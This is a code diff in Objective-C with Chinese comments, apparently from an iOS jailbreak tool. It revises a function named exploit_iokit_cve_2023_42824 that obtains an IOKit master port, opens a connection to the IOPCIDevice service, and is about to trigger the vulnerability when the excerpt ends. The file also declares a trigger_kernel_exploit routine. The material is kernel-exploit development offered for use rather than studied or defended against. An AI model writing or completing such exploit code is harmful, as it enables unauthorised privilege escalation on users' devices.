@@ -14,6 +14,7 @@ bool trigger_kernel_exploit(void);
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import "BootstrapExtractor.h"
+#import "IOKitHelper.h"
 #import <spawn.h>
 #import <sys/wait.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -185,19 +186,34 @@ static mach_port_t IOKitGetMainPort(void) {
     return MACH_PORT_NULL;
 }
 
-// 修改 exploit_iokit_cve_2023_42824 函数中使用 kIOMasterPortDefault 的地方
+// 修改 exploit_iokit_cve_2023_42824 函数，使用我们的包装函数
 bool exploit_iokit_cve_2023_42824(void) {
-    NSLog(@"[*] 尝试IOKit CVE-2023-42824漏洞...");
+    // 初始化 IOKit
+    if (!IOKitHelperInit()) {
+        NSLog(@"[-] 无法初始化 IOKit 助手");
+        return false;
+    }
     
-    // 使用 MACH_PORT_NULL 替代 kIOMasterPortDefault
-    io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL,
+    // 使用我们自己的获取主端口函数
+    mach_port_t masterPort = IOKitGetMasterPort();
+    
+    // 使用我们的包装函数
+    io_service_t service = IOServiceGetMatchingService(masterPort,
                            IOServiceMatching("IOPCIDevice"));
-    if (service == MACH_PORT_NULL) return false;
     
-    io_connect_t connect = MACH_PORT_NULL;
+    // 其余代码保持不变，但使用我们的包装函数
+    if (service == 0) {
+        NSLog(@"[-] 无法获取 IOPCIDevice 服务");
+        return false;
+    }
+    
+    io_connect_t connect = 0;
     kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
     IOObjectRelease(service);
-    if (kr != KERN_SUCCESS) return false;
+    if (kr != KERN_SUCCESS) {
+        NSLog(@"[-] 无法打开 IOPCIDevice 服务: 0x%x", kr);
+        return false;
+    }
     
     // 尝试触发漏洞
     uint64_t outBuffer[32] = {0};
